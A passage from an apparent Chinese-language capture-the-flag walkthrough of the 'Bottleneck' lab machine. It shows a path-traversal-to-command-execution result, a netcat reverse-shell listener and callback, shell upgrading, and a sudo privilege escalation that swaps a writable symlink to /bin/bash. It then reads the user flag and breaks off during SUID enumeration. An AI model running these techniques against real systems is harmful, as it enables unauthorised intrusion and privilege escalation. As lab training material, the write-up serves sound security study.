+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></td></tr></table></div></div><p>说明 Python 表达式已经被执行。</p><p>继续验证当前用户：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 read.py &#34;../../../../tmp/output&#34;
+</span></span></code></pre></td></tr></table></div></div><p>得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>www-data
+</span></span></code></pre></td></tr></table></div></div><p>再验证当前工作目录：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 read.py &#34;../../../../tmp/output&#34;
+</span></span></code></pre></td></tr></table></div></div><p>得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span>
+</span></span></code></pre></td></tr></table></div></div><p>至此确认已经从任意文件读取进一步获得了远程命令执行权限，当前执行权限为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>www-data
+</span></span></code></pre></td></tr></table></div></div><h3 id=建立反弹-shell>建立反弹 Shell</h3><p>虽然已经能够通过 IDS 执行命令，但是这种方式每执行一次命令都需要重新构造 payload。</p><p>因此下一步建立反弹 Shell，获得稳定的交互式 Shell。</p><p>首先在 Kali 上监听 4444 端口：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nc -lvnp 4444
+</span></span></code></pre></td></tr></table></div></div><p>然后通过前面已经获得的命令执行能力让靶机连接 Kali。</p><p>成功后 Kali 收到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>connect to [192.168.56.128] from (UNKNOWN) [192.168.56.4] 53754
+</span></span></code></pre></td></tr></table></div></div><p>获得 Shell：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>www-data@bottleneck:~/html$
+</span></span></code></pre></td></tr></table></div></div><h3 id=升级-shell>升级 Shell</h3><p>刚获得的反弹 Shell 属于非交互式 Shell，可以看到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>bash: cannot set terminal process group
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span></code></pre></td></tr></table></div></div><p>靶机存在 Python3，因此使用 Python3 分配伪终端：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</span></span></code></pre></td></tr></table></div></div><p>随后重新获得：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>www-data@bottleneck:~/html$
+</span></span></code></pre></td></tr></table></div></div><p>验证当前用户：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>whoami
+</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>www-data
+</span></span></code></pre></td></tr></table></div></div><p>验证当前目录：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pwd
+</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span>
+</span></span></code></pre></td></tr></table></div></div><p>查看系统信息：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>uname -a
+</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Linux bottleneck 5.0.0-29-generic #31-Ubuntu SMP Thu Sep 12 13:05:32 UTC 2019 x86_64 x86_64 x86_64 
+</span></span></code></pre></td></tr></table></div></div><h2 id=权限提升>权限提升</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@bottleneck:~/html$ id
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span><span class=line><span class=cl>www-data@bottleneck:~/html$ sudo -l
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> www-data on bottleneck:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User www-data may run the following commands on bottleneck:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>bytevsbyte<span class=o>)</span> NOPASSWD: /var/www/html/web_utils/clear_logs
+</span></span><span class=line><span class=cl>www-data@bottleneck:~/html$ namei -l /var/www/html/web_utils/clear_logs
+</span></span><span class=line><span class=cl>namei -l /var/www/html/web_utils/clear_logs
+</span></span><span class=line><span class=cl>f: /var/www/html/web_utils/clear_logs
+</span></span><span class=line><span class=cl>drwxr-xr-x root       root       /
+</span></span><span class=line><span class=cl>drwxr-xr-x root       root       var
+</span></span><span class=line><span class=cl>drwxr-xr-x root       root       www
+</span></span><span class=line><span class=cl>drwxr-xr-x root       root       html
+</span></span><span class=line><span class=cl>drwxrwxr-x www-data   www-data   web_utils
+</span></span><span class=line><span class=cl>lrwxrwxrwx www-data   www-data   clear_logs -&gt; /opt/clear_logs.sh
+</span></span><span class=line><span class=cl>drwxr-xr-x root       root         /
+</span></span><span class=line><span class=cl>drwxr-xr-x root       root         opt
+</span></span><span class=line><span class=cl>-rwxr--r-- bytevsbyte bytevsbyte   clear_logs.sh
+</span></span><span class=line><span class=cl>www-data@bottleneck:~/html$ ls -la /var/www/html/web_utils/
+</span></span><span class=line><span class=cl>ls -la /var/www/html/web_utils/
+</span></span><span class=line><span class=cl>total <span class=m>8</span>
+</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>2</span> www-data www-data <span class=m>4096</span> Sep <span class=m>26</span>  <span class=m>2019</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>7</span> root     root     <span class=m>4096</span> Sep <span class=m>26</span>  <span class=m>2019</span> ..
+</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> www-data www-data   <span class=m>18</span> Sep <span class=m>26</span>  <span class=m>2019</span> clear_logs -&gt; /opt/clear_logs.sh
+</span></span></code></pre></td></tr></table></div></div><p>web_utils 目录本身是可以写的</p><p>/opt/clear_logs.sh 不能修改</p><p>clear_logs -> /opt/clear_logs.sh 属于 www-data 位于drwxrwxr-x www-data www-data web_utils 可写</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo -u bytevsbyte /var/www/html/web_utils/clear_logs
+</span></span></code></pre></td></tr></table></div></div><h2 id=获取第一个-flag>获取第一个 Flag</h2><p>前面通过 <code>image_gallery.php</code> 的漏洞获得了一个反弹 Shell，当前身份为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@bottleneck:~/html$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>首先检查当前用户可以执行的 sudo 命令：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@bottleneck:~/html$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> www-data on bottleneck:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User www-data may run the following commands on bottleneck:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>bytevsbyte<span class=o>)</span> NOPASSWD: /var/www/html/web_utils/clear_logs
+</span></span></code></pre></td></tr></table></div></div><p>可以看到，<code>www-data</code> 无需密码即可使用 <code>sudo</code>，以 <code>bytevsbyte</code> 身份执行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/var/www/html/web_utils/clear_logs
+</span></span></code></pre></td></tr></table></div></div><h3 id=分析-clear_logs>分析 clear_logs</h3><p>查看文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@bottleneck:~/html$ cat /var/www/html/web_utils/clear_logs
+</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
+</span></span><span class=line><span class=cl>rm -f /var/log/soc/intrusion_*
+</span></span></code></pre></td></tr></table></div></div><p>进一步查看文件属性：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@bottleneck:~/html$ ls -l /var/www/html/web_utils/clear_logs
+</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> www-data www-data <span class=m>18</span> Sep <span class=m>26</span>  <span class=m>2019</span> /var/www/html/web_utils/clear_logs -&gt; /opt/clear_logs.sh
+</span></span></code></pre></td></tr></table></div></div><p>可以发现 <code>clear_logs</code> 并不是普通文件，而是一个软链接：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/var/www/html/web_utils/clear_logs
+</span></span><span class=line><span class=cl>        ↓
+</span></span><span class=line><span class=cl>/opt/clear_logs.sh
+</span></span></code></pre></td></tr></table></div></div><p>继续查看：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@bottleneck:~/html$ ls -l /opt/clear_logs.sh
+</span></span><span class=line><span class=cl>-rwxr--r-- <span class=m>1</span> bytevsbyte bytevsbyte <span class=m>43</span> Sep <span class=m>27</span>  <span class=m>2019</span> /opt/clear_logs.sh
+</span></span></code></pre></td></tr></table></div></div><p>可以确认 <code>/opt/clear_logs.sh</code> 属于 <code>bytevsbyte</code>，但当前的 <code>www-data</code> 无法直接修改它。</p><p>此时继续查看软链接所在目录：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@bottleneck:~/html$ ls -ld /var/www/html/web_utils
+</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>2</span> www-data www-data <span class=m>4096</span> Sep <span class=m>26</span>  <span class=m>2019</span> /var/www/html/web_utils
+</span></span></code></pre></td></tr></table></div></div><p><code>web_utils</code> 目录属于 <code>www-data</code>，因此当前用户可以删除、创建其中的文件。</p><p>这意味着虽然我们不能修改：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/opt/clear_logs.sh
+</span></span></code></pre></td></tr></table></div></div><p>但是可以控制：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/var/www/html/web_utils/clear_logs
+</span></span></code></pre></td></tr></table></div></div><h3 id=利用可控软链接进行提权>利用可控软链接进行提权</h3><p>首先删除原来的软链接：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@bottleneck:~/html$ rm /var/www/html/web_utils/clear_logs
+</span></span></code></pre></td></tr></table></div></div><p>确认：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@bottleneck:~/html$ ls -la /var/www/html/web_utils
+</span></span><span class=line><span class=cl>total <span class=m>8</span>
+</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>2</span> www-data www-data <span class=m>4096</span> Aug  <span class=m>9</span> 16:04 .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>7</span> root     root     <span class=m>4096</span> Sep <span class=m>26</span>  <span class=m>2019</span> ..
+</span></span></code></pre></td></tr></table></div></div><p>然后创建一个新的软链接，让 <code>clear_logs</code> 指向 <code>/bin/bash</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@bottleneck:~/html$ ln -s /bin/bash /var/www/html/web_utils/clear_logs
+</span></span></code></pre></td></tr></table></div></div><p>检查：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@bottleneck:~/html$ ls -l /var/www/html/web_utils/clear_logs
+</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> www-data www-data <span class=m>9</span> Aug  <span class=m>9</span> 16:04 /var/www/html/web_utils/clear_logs -&gt; /bin/bash
+</span></span></code></pre></td></tr></table></div></div><p>此时 sudoers 中允许执行的路径：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/var/www/html/web_utils/clear_logs
+</span></span></code></pre></td></tr></table></div></div><p>实际上已经指向了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/bin/bash
+</span></span></code></pre></td></tr></table></div></div><p>因此执行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@bottleneck:~/html$ sudo -u bytevsbyte /var/www/html/web_utils/clear_logs -i
+</span></span></code></pre></td></tr></table></div></div><p>成功获得 <code>bytevsbyte</code> 用户的交互式 Bash：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bytevsbyte@bottleneck:~/html$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>bytevsbyte<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>bytevsbyte<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>bytevsbyte<span class=o>)</span>,4<span class=o>(</span>adm<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,1001<span class=o>(</span>tester<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>bytevsbyte@bottleneck:~/html$ whoami
+</span></span><span class=line><span class=cl>bytevsbyte
+</span></span></code></pre></td></tr></table></div></div><p>至此完成：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>www-data
+</span></span><span class=line><span class=cl>    ↓
+</span></span><span class=line><span class=cl>sudo NOPASSWD
+</span></span><span class=line><span class=cl>    ↓
+</span></span><span class=line><span class=cl>可控 web_utils 目录
+</span></span><span class=line><span class=cl>    ↓
+</span></span><span class=line><span class=cl>替换 clear_logs 软链接
+</span></span><span class=line><span class=cl>    ↓
+</span></span><span class=line><span class=cl>/bin/bash
+</span></span><span class=line><span class=cl>    ↓
+</span></span><span class=line><span class=cl>bytevsbyte
+</span></span></code></pre></td></tr></table></div></div><h3 id=获取-user-flag>获取 User Flag</h3><p>进入 <code>bytevsbyte</code> 的家目录：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bytevsbyte@bottleneck:~/html$ <span class=nb>cd</span> /home/bytevsbyte
+</span></span></code></pre></td></tr></table></div></div><p>查看目录：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bytevsbyte@bottleneck:/home/bytevsbyte$ ls -liah
+</span></span><span class=line><span class=cl>total 48K
+</span></span><span class=line><span class=cl><span class=m>531398</span> drwx------ <span class=m>6</span> bytevsbyte bytevsbyte 4.0K Sep <span class=m>27</span>  <span class=m>2019</span> .
+</span></span><span class=line><span class=cl><span class=m>524290</span> drwxr-xr-x <span class=m>3</span> root       root       4.0K Sep <span class=m>23</span>  <span class=m>2019</span> ..
+</span></span><span class=line><span class=cl><span class=m>531399</span> lrwxrwxrwx <span class=m>1</span> bytevsbyte bytevsbyte    <span class=m>9</span> Sep <span class=m>24</span>  <span class=m>2019</span> .bash_history -&gt; /dev/null
+</span></span><span class=line><span class=cl><span class=m>531401</span> -rw-r--r-- <span class=m>1</span> bytevsbyte bytevsbyte  <span class=m>220</span> Apr  <span class=m>4</span>  <span class=m>2019</span> .bash_logout
+</span></span><span class=line><span class=cl><span class=m>531246</span> -rw-r--r-- <span class=m>1</span> bytevsbyte bytevsbyte 3.7K Sep <span class=m>24</span>  <span class=m>2019</span> .bashrc
+</span></span><span class=line><span class=cl><span class=m>531450</span> drwx------ <span class=m>2</span> bytevsbyte bytevsbyte 4.0K Sep <span class=m>24</span>  <span class=m>2019</span> .cache
+</span></span><span class=line><span class=cl><span class=m>531490</span> drwx------ <span class=m>3</span> bytevsbyte bytevsbyte 4.0K Sep <span class=m>24</span>  <span class=m>2019</span> .gnupg
+</span></span><span class=line><span class=cl><span class=m>531664</span> drwxrwxr-x <span class=m>3</span> bytevsbyte bytevsbyte 4.0K Sep <span class=m>24</span>  <span class=m>2019</span> .local
+</span></span><span class=line><span class=cl><span class=m>531400</span> -rw-r--r-- <span class=m>1</span> bytevsbyte bytevsbyte  <span class=m>807</span> Apr  <span class=m>4</span>  <span class=m>2019</span> .profile
+</span></span><span class=line><span class=cl><span class=m>531329</span> drwx------ <span class=m>2</span> bytevsbyte bytevsbyte 4.0K Sep <span class=m>27</span>  <span class=m>2019</span> .ssh
+</span></span><span class=line><span class=cl><span class=m>531328</span> -rw-r--r-- <span class=m>1</span> bytevsbyte bytevsbyte  <span class=m>148</span> Sep <span class=m>26</span>  <span class=m>2019</span> user.txt
+</span></span><span class=line><span class=cl><span class=m>535756</span> -rw------- <span class=m>1</span> bytevsbyte bytevsbyte   <span class=m>56</span> Sep <span class=m>27</span>  <span class=m>2019</span> .Xauthority
+</span></span></code></pre></td></tr></table></div></div><p>直接读取 <code>user.txt</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bytevsbyte@bottleneck:/home/bytevsbyte$ cat user.txt
+</span></span></code></pre></td></tr></table></div></div><p>得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Good job, this is the user flag of bottleneck machine by @bytevsbyt3 (twitter).
+</span></span><span class=line><span class=cl>I hope you liked the flow.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flag{gr34t_j0b_f0r_bottleneck_us3r}
+</span></span></code></pre></td></tr></table></div></div><p>至此获得 Bottleneck 的第一个 Flag：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>flag{gr34t_j0b_f0r_bottleneck_us3r}
+</span></span></code></pre></td></tr></table></div></div><h2 id=权限提升至-root>权限提升至 root</h2><p>获得 <code>bytevsbyte</code> 用户权限后，继续进行本地信息收集。</p><p>首先查看当前用户权限：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>id
+</span></span></code></pre></td></tr></table></div></div><p>可以看到当前用户属于 <code>tester</code> 用户组：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>uid=1000(bytevsbyte) gid=1000(bytevsbyte) groups=1000(bytevsbyte),4(adm),24(cdrom),30(dip),46(plugdev),1001(tester)
+</span></span></code></pre></td></tr></table></div></div><p>由于当前用户已经获得了一个新的本地用户权限，因此继续检查 SUID 文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>find / -perm -4000 -type f 2&gt;/dev/null
+</span></span></code></pre></td></tr></table></div></div><p>在结果中发现了一个比较特殊的文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/test/testlib
+</span></span></code></pre></td></tr></table></div></div><p>进一步查看权限：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ls -l /usr/test/testlib
